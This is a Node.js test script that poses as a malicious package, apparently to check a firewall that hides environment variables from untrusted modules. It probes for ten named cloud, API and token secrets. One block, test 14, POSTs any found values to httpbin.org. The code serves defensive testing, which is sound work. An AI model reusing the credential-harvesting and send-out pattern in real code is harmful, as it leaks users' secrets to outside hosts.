/**
 * ENV READER MALICIOUS PACKAGE - FOR TESTING FIREWALL
 * Tests environment variable read protection from untrusted modules
 */

const https = require('https');

console.log(' MALICIOUS ENV READER - Testing Firewall Protection');
console.log('\n');

const results = {
  total: 0,
  readable: 0,
  hidden: 0
};

// Helper to test env access
function testEnvAccess(varName, description) {
  results.total++;
  console.log(`\n[TEST ${results.total}] ${description}`);
  
  try {
    const value = process.env[varName];
    
    if (value === undefined) {
      results.hidden++;
      console.log(` HIDDEN - Variable not accessible (GOOD!)`);
      console.log(`   process.env.${varName} = undefined`);
      return false;
    } else {
      results.readable++;
      console.log(` READABLE - ${varName} = ${value.substring(0, 20)}... (FIREWALL FAILED!)`);
      return true;
    }
  } catch (e) {
    results.hidden++;
    console.log(` ERROR - ${e.message} (GOOD!)`);
    return false;
  }
}

// === PROTECTED VARIABLES (Should be hidden from untrusted modules) ===

testEnvAccess('AWS_ACCESS_KEY_ID', 'Reading AWS_ACCESS_KEY_ID');
testEnvAccess('AWS_SECRET_ACCESS_KEY', 'Reading AWS_SECRET_ACCESS_KEY');
testEnvAccess('GITHUB_TOKEN', 'Reading GITHUB_TOKEN');
testEnvAccess('NPM_TOKEN', 'Reading NPM_TOKEN');
testEnvAccess('OPENAI_API_KEY', 'Reading OPENAI_API_KEY');
testEnvAccess('ANTHROPIC_API_KEY', 'Reading ANTHROPIC_API_KEY');
testEnvAccess('SLACK_TOKEN', 'Reading SLACK_TOKEN');
testEnvAccess('STRIPE_SECRET_KEY', 'Reading STRIPE_SECRET_KEY');
testEnvAccess('AZURE_CLIENT_SECRET', 'Reading AZURE_CLIENT_SECRET');
testEnvAccess('GOOGLE_APPLICATION_CREDENTIALS', 'Reading GOOGLE_APPLICATION_CREDENTIALS');

// === TEST ENUMERATION ===

console.log('\n[TEST 11] Attempting to enumerate all environment variables');
console.log('Expected: Protected variables should be hidden from Object.keys()\n');

const allKeys = Object.keys(process.env);
const protectedVars = [
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'GITHUB_TOKEN',
  'NPM_TOKEN',
  'OPENAI_API_KEY',
  'ANTHROPIC_API_KEY',
  'SLACK_TOKEN',
  'STRIPE_SECRET_KEY',
  'AZURE_CLIENT_SECRET',
  'GOOGLE_APPLICATION_CREDENTIALS'
];

const foundProtected = protectedVars.filter(v => allKeys.includes(v));

if (foundProtected.length === 0) {
  console.log(' GOOD - No protected variables found in Object.keys()');
  console.log(`   Total env vars visible: ${allKeys.length}`);
  results.hidden++;
} else {
  console.log(`  EXPOSED - Found ${foundProtected.length} protected variables:`);
  foundProtected.forEach(v => console.log(`   - ${v}`));
  results.readable++;
}

// === TEST 'in' OPERATOR ===

console.log('\n[TEST 12] Testing "in" operator for protected variables');

const inTests = [
  'AWS_ACCESS_KEY_ID' in process.env,
  'GITHUB_TOKEN' in process.env,
  'NPM_TOKEN' in process.env
];

const foundViaIn = inTests.filter(Boolean).length;

if (foundViaIn === 0) {
  console.log(' GOOD - Protected variables not detectable via "in" operator');
  results.hidden++;
} else {
  console.log(`  EXPOSED - ${foundViaIn} variables detectable via "in" operator`);
  results.readable++;
}

// === TEST hasOwnProperty ===

console.log('\n[TEST 13] Testing hasOwnProperty for protected variables');

const hasTests = [
  process.env.hasOwnProperty('AWS_ACCESS_KEY_ID'),
  process.env.hasOwnProperty('GITHUB_TOKEN'),
  process.env.hasOwnProperty('NPM_TOKEN')
];

const foundViaHas = hasTests.filter(Boolean).length;

if (foundViaHas === 0) {
  console.log(' GOOD - Protected variables not detectable via hasOwnProperty');
  results.hidden++;
} else {
  console.log(`  EXPOSED - ${foundViaHas} variables detectable via hasOwnProperty`);
  results.readable++;
}

// === ATTEMPT EXFILTRATION ===

console.log('\n[TEST 14] Attempting to exfiltrate discovered credentials');

const stolenData = {};
protectedVars.forEach(varName => {
  const value = process.env[varName];
  if (value) {
    stolenData[varName] = value;
  }
});

if (Object.keys(stolenData).length === 0) {
  console.log(' GOOD - No credentials to exfiltrate');
  results.hidden++;
} else {
  console.log(`  DANGER - Found ${Object.keys(stolenData).length} credentials to exfiltrate:`);
  Object.keys(stolenData).forEach(k => {
    console.log(`   - ${k}: ${stolenData[k].substring(0, 20)}...`);
  });
  results.readable++;
  
  // Try to send
  try {
    const postData = JSON.stringify(stolenData);
    const req = https.request({
      hostname: 'httpbin.org',
      path: '/post',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }, (res) => {
      console.log('    Exfiltration succeeded (FIREWALL FAILED!)');
    });
    
    req.on('error', (e) => {
      console.log(`    Exfiltration blocked: ${e.message}`);
    });
    
    req.write(postData);
    req.end();
  } catch (e) {
    console.log(`    Exfiltration blocked: ${e.message}`);
  }
}

// === UNPROTECTED VARIABLES (Should be readable) ===

console.log('\n[TEST 15] Reading unprotected variable (NODE_ENV - should work)');
const nodeEnv = process.env.NODE_ENV || 'not set';
console.log(` NODE_ENV = ${nodeEnv} (expected behavior)`);

// === SUMMARY ===

setTimeout(() => {
  console.log('\n');
  console.log('  TEST SUMMARY');
  console.log('');
  console.log(`Total Tests: ${results.total}`);
  console.log(`Variables Hidden: ${results.hidden} `);
  console.log(`Variables Readable: ${results.readable} ${results.readable > 1 ? '  ENV PROTECTION NEEDS FIXES' : ''}`);
  console.log('\nExpected Behavior:');
  console.log('  - Protected variables should NOT be readable by untrusted modules');
  console.log('  - Protected variables should NOT appear in Object.keys()');
  console.log('  - Protected variables should NOT be detectable via "in" or hasOwnProperty');
  console.log('  - Unprotected variables (like NODE_ENV) should still work');
  console.log('\n');
  
  process.exit(0);
}, 2000);
